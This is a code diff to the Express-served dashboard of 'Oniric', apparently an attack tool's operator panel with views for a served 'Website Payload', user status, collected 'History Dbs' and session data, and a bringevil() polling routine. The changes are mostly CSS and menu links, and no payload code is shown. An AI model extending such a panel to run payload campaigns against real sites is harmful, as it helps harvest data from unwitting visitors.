@@ -67,43 +67,34 @@ export class App {
           res.send(`
 <style>
 body {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;font-family: 'Roboto Slab', serif; }
-h1 {
-margin: 0;user-select: none;text-align: center;font-weight: 300; }
-p, {max-width: 100%;max-height: 100%;font-weight: 300;color: #546E7A;user-select: none;text-align: center;margin: 0; }
+h1 {margin-top: 80px;user-select: none;text-align: center;font-weight: 300; }
+p {max-width: 100%;max-height: 100%;font-weight: 300;color: #546E7A;user-select: none;text-align: center;margin: 0; }
 a {text-align: center;text-decoration: none;color: #FFF; }
-/* Navigation menu */
 .menu {position: fixed;width: 100vw;pointer-events: none;margin-top: 10vh;text-align: center;z-index: 2; }
-/* Menu link item */
 .menu__link {display: inline-block;text-decoration: none;border: 2px solid #263238;color: #263238;pointer-events: auto;line-height: 40px;position: relative;padding: 0 50px;box-sizing: border-box;margin: 0;user-select: none;overflow: hidden;border-radius: 50px;
 &::before {content: attr(data-hover);background-color: #263238;color: #FFF;position: absolute;top: 100%;bottom: 0;left: 0;transition: all 300ms cubic-bezier(0.190, 1.000, 0.560, 1.000);right: 0; }
 &:hover::before {top: 0; }}
-/* Panels Style*/
-/* Common panel style */
 .panel {display: flex;align-items: center;justify-content: center;flex-direction: column;position: absolute;top: 0;bottom: 0;left: 0;right: 0;overflow: auto;z-index: 999;color: #000;box-sizing: border-box;background-color: #ECEFF1; }
-/* panel content (only for animation delay after open) */
 .panel__content {opacity: 0;will-change: margin-top;transition: all 700ms;transition-delay: 600ms;padding: 100px 200px;margin-top: -5%; }
 .panel__content p{text-align: center;text-decoration: none;color: #FFF;}
-/* Panel content animation after open */
 .panel:target .panel__content {opacity: 1;margin-top: 0; }
-/*  Specific "Home "panel */
-.panel#home {
-z-index: 1;
-background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 100%); }
-/*  Specific panel "Fade" effect */
+.panel#home {z-index: 1;background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 100%); }
 .panel#fade {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
 .panel#fade2 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
 .panel#fade3 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
+.panel#fade4 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
 .panel#fade:target {opacity: 1;pointer-events: auto; }
 .panel#fade2:target {opacity: 1;pointer-events: auto; }
 .panel#fade3:target {opacity: 1;pointer-events: auto; }
+.panel#fade4:target {opacity: 1;pointer-events: auto; }
 </style>
             <div class="panel" id="home">
-                <h1>Oniric</h1><br>
+              <br>  <h1>Oniric</h1><br>
             </div>
             <div class="panel" id="fade2">
                 <div class="panel__content">
                 <p>Website Payload (Server-Side)</p>
-                <p style="overflow:scroll;max-width:250px;max-height:250px">`+this.expose+`</p>
+                <p> `+this.expose+` </p>
                 </div>
                 <a href="/`+this.conf.licenseKey+`"> Close [ X ]</a>
             </div>
@@ -128,13 +119,24 @@ background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 10
                 <a href="/`+this.conf.licenseKey+`">[ X ]</a>
             </div>
             </div>
+            <div class="panel" id="fade4">
+                <div class="panel__content">
+                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
+                </div>
+            </div>
             <div class="menu">
               <a class="menu__link" href="#fade2" data-hover="Fade">Payload</a>
               <a class="menu__link" href="#fade3" data-hover="Fade">User Status</a>
               <a class="menu__link" href="#fade" data-hover="Fade">HTML Config</a>
               <a class="menu__link" href="/`+this.conf.licenseKey+`/help" data-hover="Fade">Help</a><br>
-              <a class="menu__link" href="#fade" data-hover="Fade">History Dbs</a>
-              <a class="menu__link" href="#fade" data-hover="Fade">Modify</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`/info/list" data-hover="Fade">History Dbs</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Modify Polling</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`/restart" data-hover="Fade">Restart</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Search Info</a>
+              <a class="menu__link" href="#fade4" data-hover="Fade">Modify Config</a><br>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Clear Dbs</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Port</a>
+              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Name</a>
             </div>
             `);
         });
@@ -159,10 +161,6 @@ background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 10
                   <tr>
                   <th>Restapi Link</th>
                   <th>Descrizione</th>
-                  </tr>
-                  <tr>
-                  <td>/licenseKey/help</td>
-                  <td>Ritorna questa pagina</td>
                   </tr>
                   <tr>
                   <td>/licenseKey/restart</td>
@@ -308,18 +306,6 @@ background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 10
             this.bringevil();
             res.send(`<h2> Timer Polling Aggiornato </h2>`);
             res.end();
-        });
-        app.get('/'+this.conf.licenseKey+'/session/list',(req,res)=>{
-            const sql = "SELECT * FROM session";
-            this.db.all(sql, [], function(err, rows) {
-              if (err) {
-                console.log(err);
-              }
-              res.json({
-                         "message":"success",
-                         "data":rows
-                     });
-              });
         });
         app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
           const sql = "SELECT * FROM info";
